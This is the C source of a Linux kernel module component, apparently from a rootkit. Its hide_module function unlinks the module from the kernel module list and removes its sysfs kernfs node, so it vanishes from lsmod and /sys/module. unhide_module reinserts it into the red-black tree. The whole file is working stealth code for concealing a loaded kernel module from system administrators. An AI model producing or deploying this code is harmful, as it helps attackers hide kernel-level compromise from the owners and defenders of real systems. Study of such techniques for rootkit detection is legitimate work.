#include <linux/kernfs.h>
#include <linux/module.h>
#include <linux/rbtree.h>
#include <linux/list.h>
#include <linux/hash.h>

#include "common.h"
#include "modhide.h"

static struct list_head *mod;

void
hide_module(void)
{
    struct kernfs_node *sd;

    if (mod)
        return;

    mod = THIS_MODULE->list.prev;
    sd = THIS_MODULE->mkobj.kobj.sd;

    list_del(&THIS_MODULE->list);
    rb_erase(&sd->rb, &sd->parent->dir.children);
    /* sd->rb.__rb_parent_color = (unsigned long)(&sd->rb); */
}

void
unhide_module(void)
{
    int res;
    struct kernfs_node *sd;
    struct rb_root *root;
    struct rb_node *parent;
    struct rb_node **new;

    if (!mod)
        return;

    sd = THIS_MODULE->mkobj.kobj.sd;
    root = &sd->parent->dir.children;
    new = &root->rb_node;
    parent = NULL;

    list_add(&THIS_MODULE->list, mod);

    { // Insert our module back into the RB tree of modules
        // Search for the place to insert, insert, then rebalance tree,
        // as per https://www.kernel.org/doc/Documentation/rbtree.txt
        while (*new) {
            static struct kernfs_node *rb;

            parent = *new;
            rb = rb_entry(*new, struct kernfs_node, rb);

            // https://elixir.bootlin.com/linux/v4.19/source/include/linux/kernfs.h#L132
            // Determine insert position based on 1. hash,
            // 2. (upon collision) namespace, and 3. (otherwise) name
            res = (sd->hash == rb->hash)
                ? ((sd->ns == rb->ns)
                    ? strcmp(sd->name, rb->name)
                    : sd->ns - rb->ns)
                : sd->hash - rb->hash;

            if (res < 0)
                new = &((*new)->rb_left);
                /* new = &(rb->rb.rb_left); */
            else if (res > 0)
                new = &((*new)->rb_right);
                /* new = &(rb->rb.rb_right); */
            else
                return;
        }

        rb_link_node(&sd->rb, parent, new);
        rb_insert_color(&sd->rb, root);
    }

	/* if (kernfs_type(sd) == KERNFS_DIR) */
	/* 	++sd->parent->dir.subdirs; */

    mod = NULL;
}
